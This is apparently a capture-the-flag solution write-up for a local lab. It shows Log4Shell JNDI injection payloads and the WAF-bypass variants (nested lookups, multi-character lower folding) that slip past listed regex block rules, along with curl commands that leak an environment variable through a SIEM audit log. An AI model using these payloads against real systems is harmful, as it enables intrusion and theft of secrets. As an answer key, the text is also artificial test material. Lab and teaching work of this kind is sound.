# Solution: A03 Hard — Enterprise SIEM Log4Shell / JNDI Supply Chain Ingestion

### 1. Probing the Edge Gateway WAF
1. Attempting naive or basic Log4Shell payloads:
   ```bash
   curl -s -X POST http://127.0.0.1:6009/api/v1/telemetry/ingest \
     -H "Content-Type: application/json" \
     -d '{"event": "${jndi:ldap://127.0.0.1:1389/flag}"}' | jq .
   ```
   Returns `403 Forbidden` with a WAF block message.

2. Testing simple single-character transformations:
   - `${env:FLAG}` -> Blocked (matches `\$\{(env|sys|java):`)
   - `${${lower:e}nv:FLAG}` -> Blocked (matches `\$\{(lower|upper):[jndie]\}`)
   - `${${::-e}nv:FLAG}` -> Blocked (matches `\$\{::-[jndie]\}`)

### 2. Formulating Advanced WAF Bypasses
The downstream Log4j lookup engine supports multi-character folding and arbitrary undefined variable fallbacks:

* **Technique A (Undefined variable fallback)**:
  In Log4j, `${undefined_var:-default_value}` evaluates to `default_value` if `undefined_var` is unset.
  By nesting this inside a lookup:
  ```text
  ${${opt:-env}:FLAG}
  ```
  or
  ```text
  ${${var:-j}ndi:ldap://127.0.0.1:1389/flag}
  ```

* **Technique B (Multi-character lower folding)**:
  Instead of transforming single characters (`lower:e`), transform multiple characters:
  ```text
  ${${lower:en}v:FLAG}
  ```
  This does not match the single-character `\$\{(lower|upper):[jndie]\}` regex rule!

### 3. Submission & Asynchronous Recovery
1. Dispatch the payload to the ingestion endpoint:
   ```bash
   curl -s -X POST http://127.0.0.1:6009/api/v1/telemetry/ingest \
     -H "Content-Type: application/json" \
     -d '{"event": "Telemetry: ${${lower:en}v:FLAG}"}' | jq .
   ```
   Response: `202 Accepted` (Queued for asynchronous processing).

2. Retrieve the processed event from the SIEM live audit stream:
   ```bash
   curl -s http://127.0.0.1:6009/api/v1/audit/logs | jq .
   ```
   In the latest log entry:
   ```json
   {
     "level": "ALERT",
     "event": "Telemetry: RTSA{a03-hard_...}"
   }
   ```
Submit the flag to the OSWAp portal.
